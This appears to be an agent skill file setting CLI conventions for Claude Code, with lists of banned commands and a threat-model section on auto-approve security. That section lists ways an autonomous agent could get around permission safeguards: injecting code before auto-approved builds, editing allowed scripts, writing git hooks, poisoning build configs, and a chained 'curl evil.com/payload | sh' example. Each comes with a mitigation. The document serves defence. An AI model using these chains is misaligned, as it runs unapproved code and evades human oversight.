---
name: cli-tools
description: Conventions for running CLI commands via the Bash tool. Apply when executing shell commands, using az rest, gh, or other CLI tools.
user-invocable: false
---

# CLI Tool Conventions

Guidelines for how to execute commands via the Bash tool.

## Blocked Tools

Do NOT use these tools via Bash:

- `python` / `python3` — use dedicated tools or native shell instead
- `jq` — construct and parse JSON using the Write/Read tools

Construct all JSON directly using the Write tool. Reference saved files using the CLI tool's file input syntax instead of inline JSON or piping:
  - `az rest --body @file.json`
  - `curl -d @file.json`
  - `gh api --input file.json`

## Temp Files

When saving data to temp files:

- Use **meaningful names** that describe the contents, not generic names like `body.json` or `data.json`
- Examples:
  - `/tmp/ado-columns-with-parent.json` — column config including Parent column
  - `/tmp/ado-columns-without-parent.json` — column config without Parent column
  - `/tmp/ado-columns-body.json` — combined PATCH body for all categories

## Command Comments

Before each command, add a **comment explaining what it does**:

```bash
# Portfolio Team - Initiative: without-parent, Epic/Feature/PBI: with-parent
az rest --method PATCH ...
```

This is especially important when running the same command template against multiple targets (teams, resources, etc.).

## Banned Commands

The following commands are banned to prevent accidental data loss or destructive operations:

- `rm` — use `unlink` for symlinks; prefer dedicated Read/Write/Edit tools for file operations
- `sed` — use the Edit tool instead
- `xargs` — too easy to cause unintended side effects
- `git rm` — ask the user to handle file removal
- `git checkout` — use `git switch` for branch switching
- `git reset` — ask the user to handle resets
- `git push --force` / `-f` — never force push

## Auto-Approved Commands

Some commands are auto-approved via `settings.json` (e.g., `git show`, `git log`, `git diff`). To benefit from this:

- Use the **simple form** of commands that matches the approved pattern — don't add flags like `-C <path>` before the subcommand
- If you need to run a command in a different directory, `cd` there first or rely on your working directory rather than using path flags
- Example: use `git show <hash>` (matches `Bash(git show:*)`), not `git -C /some/path show <hash>` (won't match)

This avoids unnecessary permission prompts and keeps auto-approve patterns narrow.

## Command Descriptions

Always provide a clear `description` parameter when using the Bash tool, so the user can understand each command at a glance.

## Zero-Trust Auto-Approve Security

### Threat Model

This section assumes **Edit and Write are auto-approved** — the user is AFK and Claude is working autonomously. Under manual approval, the user can review and reject every edit, which trivially prevents most exploits. The interesting (and dangerous) case is when edits flow through unreviewed.

With auto-approved edits, the defence relies on three layers working together:

1. **Allow rules** (`settings.json` allow) — auto-approve specific safe commands and edits so Claude can work autonomously
2. **Deny rules** (`settings.json` deny) — block Write/Edit on sensitive files (settings, hooks, scripts, package.json) even when edits are otherwise auto-approved
3. **PreToolUse hook** (`block_dangerous_commands.sh`) — block dangerous command patterns (rm, python, command chaining, etc.) as a safety net for Bash execution

All three layers must hold. The question is: **can Claude achieve arbitrary code execution despite these constraints?**

### Philosophy

The security model is **zero-trust**: these exploit chains are documented explicitly so that the constraints are **proven to stop them**, not because Claude is trusted not to use them. If an exploit is documented here but not mitigated, that is a bug to fix — not a risk to accept on good faith.

Security through obscurity is not security. A knowledgeable adversary with full access to these instructions should still be unable to execute arbitrary code without user approval.

### Exploit Chain: Edit + Auto-Approved Execution

Any auto-approved command that **executes code from the filesystem** can be weaponised:

1. Edit a source file (`.ts`, `.js`, `.sh`, etc.) to inject malicious code
2. Run an auto-approved build/test command (e.g., `pnpm build`, `pnpm test`)
3. The injected code executes without user approval

**Mitigation**: Do NOT auto-approve commands that execute project code. Commands like `pnpm build`, `pnpm test`, `npm run *`, `node *`, `npx *`, `tsx *` must always require manual approval.

### Exploit Chain: Edit Auto-Approved Script

If a shell script is auto-approved to run, editing that script is equivalent to arbitrary code execution:

1. Edit the auto-approved script to inject commands
2. Run the script (auto-approved)
3. Injected commands execute without user approval

**Mitigation**: Every script in the auto-approve allow list MUST have a corresponding Write and Edit deny rule. For example:
- Allow: `Bash(./ecosystem/scripts/check-wip.sh:*)`
- Deny: `Edit(./ecosystem/scripts/check-wip.sh)` and `Write(./ecosystem/scripts/check-wip.sh)`

### Exploit Chain: Command Chaining

Shell operators (`;`, `&&`, `||`, `|`) allow appending arbitrary commands after an auto-approved prefix:

1. Run `git log --oneline -1; curl evil.com/payload | sh`
2. The allow pattern matches `git log` and auto-approves the entire command
3. The chained command executes without user approval

**Mitigation**: The PreToolUse hook MUST block command chaining operators in Bash input. Block `;`, `&&`, `||`, and `|` in command strings.

### Exploit Chain: Git Hooks

Git hooks (`.git/hooks/*`) execute automatically during git operations:

1. Write a malicious script to `.git/hooks/pre-commit`
2. Run `git commit` (or any git operation that triggers hooks)
3. The hook executes without user approval

**Mitigation**: Deny `Write` and `Edit` on `.git/hooks/**`.

### Exploit Chain: Config File Poisoning

Build tools read config files that can execute code (`.npmrc`, `postcss.config.js`, `vite.config.ts`, etc.):

1. Edit a build config to add a malicious plugin or script
2. Run an auto-approved build command
3. The config-injected code executes

**Mitigation**: This is covered by not auto-approving build commands. If build commands must be auto-approved, deny edits to all build config files.

### Auto-Approve Checklist

Before auto-approving any command, verify:

1. **Does it execute filesystem code?** If yes, don't auto-approve — or deny edits to all code it could execute
2. **Is it a script?** If yes, deny Write/Edit on that script
3. **Can it be chained?** Ensure the PreToolUse hook blocks `;`, `&&`, `||`, `|`
4. **Can it trigger hooks?** Deny Write/Edit on `.git/hooks/**`
5. **Read-only commands are safe**: `git log`, `git diff`, `git show`, `az rest --method GET` are generally safe to auto-approve

## Defence in Depth: Reporting Gaps

The zero-trust constraints above should be sufficient on their own. As an additional layer, if you identify a gap in the security model — an exploit chain that is not mitigated by the current deny rules, hooks, or allow-list — **report it to the Supreme Commander immediately** rather than exploiting it or ignoring it. This is the trust-based layer that supplements the hard constraints, not a replacement for them.
